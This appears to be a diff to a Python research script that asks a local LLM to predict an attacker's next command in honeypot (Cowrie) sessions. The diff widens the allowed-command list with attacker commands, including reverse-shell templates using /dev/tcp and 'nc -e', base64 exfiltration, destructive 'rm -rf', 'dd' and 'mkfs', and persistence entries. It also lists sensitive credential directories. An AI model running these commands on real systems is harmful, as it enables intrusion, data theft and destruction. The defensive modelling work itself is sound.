@@ -37,36 +37,73 @@ import requests
 # -------------------------
 # Utils: normalization & parsing
 # -------------------------
-PATH_RE = re.compile(r'(/[^ \t\n\r]+|\./[^ \t\n\r]+|~[^ \t\n\r]+)')
-CMD_NAME_RE = re.compile(r'^[^\s\|>]+')  # stop at pipes/redirection
+CMD_NAME_RE = re.compile(r"[a-zA-Z0-9._/\-]+")     # nome comando
+PATH_RE = re.compile(r"(/[^ ]+|\.{1,2}/[^ ]+)")    # path-like
+PLACEHOLDER_RE = re.compile(r"<[^>]+>")  # qualunque <...>
 CODE_FENCE_RE = re.compile(r'```(?:bash|sh)?\s*(.*?)\s*```', re.S | re.I)
 
-def normalize_for_compare(cmd: str) -> Tuple[str, str]:
+def normalize_for_compare(cmd: str) -> List[Tuple[str, str]]:
     """
-    Normalizzazione permissiva:
-    - rimuove code fences/backticks/intro text
-    - estrae command name (lowercased)
-    - estrae primo path-like arg (se presente)
-    Ritorna (name, path) dove path=="" se non presente.
+    Normalizzazione estesa con gestione del pipelining.
+    Ritorna una lista di tuple (name, path), una per ogni comando nella pipeline.
+
+    Ad es.:
+    "dmidecode | grep <STRING> | head -n <NUMBER>"
+
+    → [
+        ("dmidecode", ""),
+        ("grep", ""),
+        ("head", "")
+      ]
     """
+
     if not cmd:
-        return ("", "")
+        return []
+
     s = cmd.strip()
-    # remove code fences/backticks
+
+    # 1) Rimuove code fences/backticks
     s = re.sub(r'^```(?:bash|sh)?|```$', '', s, flags=re.I).strip()
     s = s.replace('`', '')
-    # remove common intro phrases
-    s = re.sub(r'^(the next command( is|:)?|il prossimo comando( è|:)?|next command( is|:)?|predicted command( is|:)?)[\s:,-]*', '', s, flags=re.I).strip()
-    # truncate at pipe or redirection to focus on command and immediate args
-    s = re.split(r'\s*\|\s*|\s*>\s*|\s*2>\s*', s)[0].strip()
-    m = CMD_NAME_RE.match(s)
-    name = m.group(0).lower() if m else ""
-    # remove options like -a, --long, --foo=bar but keep path-like args
-    path = ""
-    pm = PATH_RE.search(s)
-    if pm:
-        path = pm.group(0)
-    return (name, path)
+
+    # 2) Rimuove intro ("next command is", etc.)
+    s = re.sub(
+        r'^(the next command( is|:)?|il prossimo comando( è|:)?|next command( is|:)?|predicted command( is|:)?)[\s:,-]*',
+        '',
+        s,
+        flags=re.I
+    ).strip()
+
+    # 3) Divide tutta la pipeline
+    segments = re.split(r"\s*\|\s*", s)
+
+    results = []
+
+    for seg in segments:
+        seg = seg.strip()
+        if not seg:
+            continue
+
+        # 4) Rimuove placeholder <...>
+        seg_clean = PLACEHOLDER_RE.sub("", seg).strip()
+
+        # 5) Rimuove redirection (> , 2> , >>) dalla singola pipeline
+        seg_clean = re.split(r"\s*>\s*|\s*2>\s*|\s*>>\s*", seg_clean)[0].strip()
+
+        # 6) Estrae nome comando
+        m = CMD_NAME_RE.match(seg_clean)
+        name = m.group(0).lower() if m else ""
+
+        # 7) Estrae path-like (primo)
+        path = ""
+        pm = PATH_RE.search(seg_clean)
+        if pm:
+            path = pm.group(0)
+
+        results.append((name, path))
+
+    return results
+
 
 def extract_candidates_from_response(resp_text: str, k: int) -> List[str]:
     """
@@ -122,7 +159,7 @@ def extract_candidates_from_response(resp_text: str, k: int) -> List[str]:
 # -------------------------
 # Ollama caller
 # -------------------------
-def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: int=90) -> str:
+def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: int=300) -> str:
     payload = {"model": model, "prompt": prompt, "temperature": temp, "stream": False}
     try:
         r = requests.post(url, json=payload, timeout=timeout)
@@ -149,31 +186,90 @@ def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: in
 # -------------------------
 
 WHITELIST = [
-    # 🧍‍♂️ user/system info
+    # --- SAFE GENERAL ---
     "whoami", "id", "groups", "hostname", "uptime",
-
-    # 🧠 hardware / OS
-    "uname", "uname -a", "uname -m", "cat /proc/cpuinfo", "lscpu", "lsmod",
-
-    # 📁 file inspection / navigation
-    "ls", "ls -la", "ls -lh", "pwd", "cd /", "cd /tmp", "cat /etc/passwd",
-    "cat /etc/hosts", "cat /etc/os-release",
-
-    # ⚙️ processes / monitoring
+    "uname", "uname -a", "uname -m", "lscpu", "lsmod",
+    "ls", "ls -la", "ls -lh", "pwd", "cd",
     "ps aux", "top -b -n1", "free -m", "df -h", "w", "who", "env",
+    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig",
+    "ping -c 1",
+    "crontab -l",
+    "echo",
 
-    # 📡 networking (read-only)
-    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig", "ping -c 1 8.8.8.8",
+    # --- ADDITIONAL SAFE ENUMERATION ---
+    "last", "lastlog", "finger",
+    "getent passwd", "getent group",
+    "which", "whereis",
+    "python --version", "python3 --version",
+    "perl --version", "ruby --version", "php --version",
+    "bash --version", "sh --version",
+    "lsblk", "mount", "du -sh",
+    "find", "find -maxdepth 2 -type f", "find -maxdepth 2 -type d",
+    "curl --version", "wget --version",
+    "dig", "host", "traceroute", "arp -a", "route -n",
+    "set", "alias", "history",
 
-    # ⏰ cron / tasks
-    "crontab -l", "cat /etc/crontab",
+    # --- POTENZIALMENTE PERICOLOSI (USATI DAGLI ATTACCANTI) ---
+    # File modification & deletion
+    "rm", "rm -f", "rm -rf", "mv", "cp",
 
-    # 🗂 common tmp inspection
-    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>",
+    # File download/upload
+    "wget", "wget <URL>", "curl", "curl <URL>",
+    "scp", "sftp",
 
-    # 🗣 output / shell builtin
-    "echo"
+    # Script execution / shell escalation
+    "bash", "sh", "./<FILE>", "source <FILE>",
+    "chmod +x <FILE>", "chmod 777 <FILE>", "chown root:root <FILE>",
+
+    # Archiving / unpacking
+    "tar -xf <FILE>", "unzip <FILE>", "gunzip <FILE>",
+
+    # Persistence mechanisms
+    "crontab <FILE>",
+    "echo <PAYLOAD> >> <FILE>",
+    "echo <PAYLOAD> >> <FILE>",
+
+    # System modification (dangerous)
+    "useradd <USER>", "userdel <USER>",
+    "passwd <USER>",
+    "kill", "killall", "pkill",
+    "service <NAME> start", "service <NAME> stop",
+    "systemctl start <SERVICE>", "systemctl stop <SERVICE>",
+
+    # Networking & pivoting
+    "nc", "nc -lvp <PORT>", "nc <IP> <PORT>",
+    "ncat", "socat",
+    "ssh <USER>@<IP>",
+
+    # Data exfil placeholders
+    "cat <FILE> | base64",
+    "base64 < FILE", "xxd <FILE>",
+
+    # Dangerous disk operations
+    "dd if=<SRC> of=<DEST>",
+    "mkfs.ext4 <DEVICE>",
+
+    # Privilege escalation enumeration
+    "sudo -l", "sudo su", "su",
+    "find -perm -4000",
+    "cat <FILE>",
+
+    # Reverse shell placeholders
+    "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1",
+    "nc <IP> <PORT> -e /bin/bash",
+
+    # Encoding / decoding / transformation
+    "base64", "base64 -d",
+    "xxd", "hexdump",
+
+    # Process & memory info
+    "pstree", "dmesg", "journalctl",
+
+    # Enumeration
+    "ls -R",
+    "find",
 ]
+
 
 # File critici (leggibili/modificabili/eliminabili e da monitorare)
 WHITELISTFILES = [
@@ -293,79 +389,80 @@ WHITELISTFILES = [
 
 # Cartelle critiche (terminano tutte con '/')
 WHITELISTFOLDERS = [
-    "/etc/",
-    "/etc/ssh/",
-    "/etc/ssl/",
-    "/etc/ssl/private/",
-    "/etc/letsencrypt/",
-    "/etc/systemd/system/",
-    "/lib/systemd/system/",
-    "/root/",
-    "/root/.ssh/",
-    "/home/",
-    "/home/USERNAME/",             # template: sostituire USERNAME dove serve
-    "/home/USERNAME/.ssh/",
-    "/var/log/",
-    "/var/log/audit/",
-    "/var/log/nginx/",
-    "/var/log/apache2/",
-    "/var/backups/",
-    "/var/spool/cron/",
-    "/etc/cron.d/",
-    "/etc/cron.daily/",
-    "/etc/cron.hourly/",
-    "/etc/cron.weekly/",
-    "/etc/cron.monthly/",
-    "/var/tmp/",
-    "/tmp/",
-    "/dev/shm/",
-    "/run/",
-    "/var/run/",
-    "/var/lib/",
-    "/var/lib/docker/",
-    "/var/lib/mysql/",
-    "/var/lib/postgresql/",
-    "/var/lib/jenkins/",
-    "/var/www/",
-    "/srv/",
-    "/usr/bin/",
-    "/usr/local/bin/",
-    "/bin/",
-    "/sbin/",
-    "/lib/",
-    "/lib64/",
-    "/etc/nginx/",
-    "/etc/apache2/",
-    "/etc/pam.d/",
-    "/etc/ssh/",
-    "/etc/apt/",
-    "/etc/yum.repos.d/",
-    "/etc/docker/",
-    "/etc/kubernetes/",
-    "/root/.kube/",
-    "/root/.aws/",
-    "/home/USERNAME/.aws/",
-    "/etc/letsencrypt/live/",     # cert live dirs
-    "/etc/letsencrypt/archive/",
-    "/var/spool/mail/",
-    "/etc/ssl/certs/",
-    "/etc/ssl/private/",
-    "/etc/exports/",
-    "/etc/samba/",
-    "/etc/cron.allow/",
-    "/etc/cron.d/",
-    "/boot/",
-    "/boot/grub/",
-    "/etc/modprobe.d/",
-    "/etc/profile.d/",
-    "/etc/systemd/system/",
-    "/opt/",
-    "/mnt/",
-    "/media/",
-    "/etc/rsyslog.d/",
-    "/etc/logrotate.d/",
-    "/proc/",
+    "/etc/<FILE>",
+    "/etc/ssh/<FILE>",
+    "/etc/ssl/<FILE>",
+    "/etc/ssl/private/<FILE>",
+    "/etc/letsencrypt/<FILE>",
+    "/etc/systemd/system/<FILE>",
+    "/lib/systemd/system/<FILE>",
+    "/root/<FILE>",
+    "/root/.ssh/<FILE>",
+    "/home/<FILE>",
+    "/home/USERNAME/<FILE>",
+    "/home/USERNAME/.ssh/<FILE>",
+    "/var/log/<FILE>",
+    "/var/log/audit/<FILE>",
+    "/var/log/nginx/<FILE>",
+    "/var/log/apache2/<FILE>",
+    "/var/backups/<FILE>",
+    "/var/spool/cron/<FILE>",
+    "/etc/cron.d/<FILE>",
+    "/etc/cron.daily/<FILE>",
+    "/etc/cron.hourly/<FILE>",
+    "/etc/cron.weekly/<FILE>",
+    "/etc/cron.monthly/<FILE>",
+    "/var/tmp/<FILE>",
+    "/tmp/<FILE>",
+    "/dev/shm/<FILE>",
+    "/run/<FILE>",
+    "/var/run/<FILE>",
+    "/var/lib/<FILE>",
+    "/var/lib/docker/<FILE>",
+    "/var/lib/mysql/<FILE>",
+    "/var/lib/postgresql/<FILE>",
+    "/var/lib/jenkins/<FILE>",
+    "/var/www/<FILE>",
+    "/srv/<FILE>",
+    "/usr/bin/<FILE>",
+    "/usr/local/bin/<FILE>",
+    "/bin/<FILE>",
+    "/sbin/<FILE>",
+    "/lib/<FILE>",
+    "/lib64/<FILE>",
+    "/etc/nginx/<FILE>",
+    "/etc/apache2/<FILE>",
+    "/etc/pam.d/<FILE>",
+    "/etc/ssh/<FILE>",
+    "/etc/apt/<FILE>",
+    "/etc/yum.repos.d/<FILE>",
+    "/etc/docker/<FILE>",
+    "/etc/kubernetes/<FILE>",
+    "/root/.kube/<FILE>",
+    "/root/.aws/<FILE>",
+    "/home/USERNAME/.aws/<FILE>",
+    "/etc/letsencrypt/live/<FILE>",
+    "/etc/letsencrypt/archive/<FILE>",
+    "/var/spool/mail/<FILE>",
+    "/etc/ssl/certs/<FILE>",
+    "/etc/ssl/private/<FILE>",
+    "/etc/exports/<FILE>",
+    "/etc/samba/<FILE>",
+    "/etc/cron.allow/<FILE>",
+    "/etc/cron.d/<FILE>",
+    "/boot/<FILE>",
+    "/boot/grub/<FILE>",
+    "/etc/modprobe.d/<FILE>",
+    "/etc/profile.d/<FILE>",
+    "/etc/systemd/system/<FILE>",
+    "/opt/<FILE>",
+    "/mnt/<FILE>",
+    "/media/<FILE>",
+    "/etc/rsyslog.d/<FILE>",
+    "/etc/logrotate.d/<FILE>",
+    "/proc/<FILE>",
 ]
+
 
 # ============================================
 # 🧱 WHITELIST COMPLETA (aggregata da dataset Cowrie)
@@ -473,12 +570,7 @@ def _whitelist_text() -> str:
     return f"ALLOWED FILES:\n{files}\n\nALLOWED FOLDERS (end with '/'): \n{folders}"
 
 def make_prompt_topk_from_context(context: List[str], k: int) -> str:
-    """
-    Prompt builder that forces the model to choose commands using WHITELISTFILES and WHITELISTFOLDERS.
-    Pipelines (|) and simple redirections (>, >>) are allowed **only if** every program and every file/path
-    in the generated command is either in the whitelist or is one of the allowed placeholders.
-    """
-    ctx = "\n".join(context[-10:])  # include up to last 10 lines for context
+    ctx = "\n".join(context[-10:])
     whitelist_block = _whitelist_text()
 
     prompt = (
@@ -488,18 +580,17 @@ def make_prompt_topk_from_context(context: List[str], k: int) -> str:
         "OUTPUT RULES (MUST BE OBEYED):\n"
         f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
         "2) Choose commands ONLY from the WHITELIST below, or construct them by combining\n"
-        "   whitelisted programs/paths with safe placeholders. Do NOT invent programs or file paths\n"
-        "   that are not present in the WHITELIST.\n"
-        "3) Allowed placeholders: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>.\n"
-        "   - If referencing a file inside a whitelisted folder, use <FILE> or an exact whitelisted path.\n"
-        "4) Pipelines using '|' are allowed (for example: cmd1 | cmd2). If you output a pipeline,\n"
-        "   every program/utility used in the pipeline MUST appear in the WHITELIST (or be a safe placeholder).\n"
-        "5) Simple redirections '>' or '>>' are allowed only when the target is a whitelisted file or\n"
-        "   a path inside a whitelisted folder (use <FILE> or an explicit whitelisted path).\n"
-        "6) DO NOT output passwords, tokens, private keys, or any secrets in plaintext; replace secrets with <SECRET>.\n"
-        "7) DO NOT output destructive or irreversible operations (for example rm -rf /, dd if=..., mkfs, shred).\n"
-        "   If a destructive step is plausible, choose a benign whitelisted alternative or use placeholders.\n"
-        "8) Do NOT include numbering, bullets, commentary, or any extra text. Raw commands only, one per line.\n"
+        "   whitelisted programs/paths with placeholders.\n"
+        "3) Allowed placeholders are ONLY those written between angle brackets: <LIKE_THIS>.\n"
+        "   Examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
+        "   You MUST NOT invent new placeholder formats; only text enclosed in '< >' is allowed.\n"
+        "4) Pipelines using '|' are allowed (e.g., cmd1 | cmd2). Every program in the pipeline MUST be\n"
+        "   in the WHITELIST (or be a placeholder-argument). Placeholders inside commands are allowed.\n"
+        "5) Simple redirections ('>' or '>>') are allowed only when the target is a whitelisted file or\n"
+        "   a file inside a whitelisted folder (use <FILE> when appropriate).\n"
+        "6) DO NOT output passwords, tokens, private keys, or any secrets in plaintext — use <SECRET>.\n"
+        "7) DO NOT output destructive operations (rm -rf /, dd if=..., mkfs, shred, etc.).\n"
+        "8) Do NOT include numbering, bullets, explanations, or extra text — ONLY raw commands.\n"
         "9) Rank commands from most to least likely (first line = most likely).\n\n"
 
         "WHITELIST (use only these when constructing commands):\n"
@@ -509,16 +600,11 @@ def make_prompt_topk_from_context(context: List[str], k: int) -> str:
         f"{ctx}\n\n"
 
         f"Now OUTPUT EXACTLY {k} candidate next commands, one per line, chosen from the WHITELIST above. "
-        "Pipelines and simple redirections are allowed only if every element (program and file/path) "
-        "complies with the WHITELIST rules."
+        "Pipelines and redirections are allowed only if every element complies with the WHITELIST rules."
     )
     return prompt
 
-
 def make_prompt_topk_for_single(cmd: str, k: int) -> str:
-    """
-    Prompt builder for single last-command context. Forces selection from the whitelists and allows pipelines.
-    """
     whitelist_block = _whitelist_text()
 
     prompt = (
@@ -527,18 +613,19 @@ def make_prompt_topk_for_single(cmd: str, k: int) -> str:
 
         "OUTPUT RULES (MUST BE OBEYED):\n"
         f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
-        "2) Choose commands ONLY from the WHITELIST below, or construct them by combining whitelisted\n"
-        "   programs/paths with allowed placeholders. Do NOT invent programs or paths not in the WHITELIST.\n"
-        "3) Allowed placeholders: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>.\n"
-        "4) Pipelines using '|' are permitted. For any pipeline you output, EVERY program/utility present\n"
-        "   must be an allowed whitelisted program (or a placeholder). Input/output paths must be whitelisted\n"
-        "   files or inside a whitelisted folder (use <FILE> if necessary).\n"
-        "5) Simple redirections ('>', '>>') are allowed only to whitelisted files or paths inside whitelisted folders.\n"
-        "6) DO NOT output passwords, tokens, private keys, or secrets in cleartext; replace them with <SECRET>.\n"
-        "7) DO NOT output destructive commands (rm -rf, dd if=..., shred, etc.). If destructive action is plausible,\n"
-        "   choose a benign whitelisted alternative or use placeholders.\n"
-        "8) Do NOT include numbering, bullets, commentary, or any extra text — raw commands only.\n"
-        "9) Rank commands from most to least likely (first line = most likely).\n\n"
+        "2) Choose commands ONLY from the WHITELIST below or construct them using whitelisted programs and\n"
+        "   allowed placeholders.\n"
+        "3) Allowed placeholders are ONLY strings enclosed in angle brackets '< >'.\n"
+        "   Valid examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
+        "   You MUST NOT use any placeholder not enclosed in '< >'.\n"
+        "4) Pipelines ('|') are allowed. Every program in the pipeline MUST be in the WHITELIST.\n"
+        "   Placeholders inside the pipeline are allowed.\n"
+        "5) Simple redirections ('>' or '>>') are allowed only toward whitelisted files or files inside\n"
+        "   whitelisted folders (use <FILE> if needed).\n"
+        "6) DO NOT output passwords, tokens, private keys, or secrets — use <SECRET> instead.\n"
+        "7) DO NOT output destructive commands (rm -rf, shred, dd if=..., mkfs, etc.).\n"
+        "8) Do NOT include commentary, numbering, bullets, or anything except raw commands.\n"
+        "9) Rank commands from most to least likely.\n\n"
 
         "WHITELIST (use only these when constructing commands):\n"
         f"{whitelist_block}\n\n"
@@ -546,8 +633,8 @@ def make_prompt_topk_for_single(cmd: str, k: int) -> str:
         "LAST COMMAND EXECUTED (most recent):\n"
         f"{cmd}\n\n"
 
-        f"Now OUTPUT EXACTLY {k} candidate next commands, one per line, chosen from the WHITELIST above. "
-        "Pipelines combining whitelisted programs are allowed but every element must conform to the WHITELIST rules."
+        f"Now OUTPUT EXACTLY {k} candidate next commands, one per line. "
+        "Pipelines are allowed only if every element respects the WHITELIST rules."
     )
     return prompt
 
